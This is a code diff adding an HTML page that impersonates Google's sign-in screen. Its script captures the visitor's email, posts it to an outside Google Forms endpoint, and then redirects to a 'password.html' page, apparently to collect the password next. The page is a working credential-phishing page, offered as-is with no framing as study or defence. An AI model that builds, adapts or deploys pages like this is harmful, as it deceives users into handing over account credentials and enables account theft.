@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Sign In</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+
+<div class="background-image"></div>
+
+<div class="login-box">
+    <img src="https://cdn.vox-cdn.com/thumbor/Pkmq1nm3skO0-j693JTMd7RL0Zk=/0x0:2012x1341/1200x800/filters:focal(0x0:2012x1341)/cdn.vox-cdn.com/uploads/chorus_image/image/47070706/google2.0.0.jpg">
+    <h1>Sign in</h1>
+    <x1> Use your Google Account</x1>
+    <form id="emailForm" action="https://docs.google.com/forms/d/e/1FAIpQLSedOwTGd2uqRpoF7ORfxH_3QInNWeccQbb-dP_7pbYIexamxA/formResponse" method="POST" onsubmit="submitFormAndRedirect(event)">
+        <input type="text" name="entry.1236909301" id="email" placeholder="  Email or phone">
+        <br>
+        <x2> Forgot email?</x2>
+        <small>Not your computer? Use a private browsing window to sign<br> in. <span> Learn more</span></small>
+        <x3> Create Account</x3>
+        <button type="submit"> Next </button>
+    </form>
+</div>
+
+<script>
+function submitFormAndRedirect(event) {
+    event.preventDefault(); // Prevent default form submission
+
+    var form = document.getElementById("emailForm");
+    var email = form.elements["entry.1236909301"].value;
+
+    // Check if email contains ".com"
+    if (email.includes('.com')) {
+        // Submit the form data to the Google Form
+        fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form),
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.log('Form submission failed.');
+            }
+        })
+        .catch(error => {
+            console.error('Error submitting form:', error);
+        })
+        .finally(() => {
+            // Redirect to password.html after a 2-second delay
+            setTimeout(function() {
+                window.location.href = 'password.html';
+            }, 2000); // 2-second delay
+        });
+
+        return true; // Submit the form
+    } else {
+        // Show error message
+        alert("Please enter a valid email address.");
+        return false; // Prevent form submission
+    }
+}
+</script>
+
+</body>
+</html>
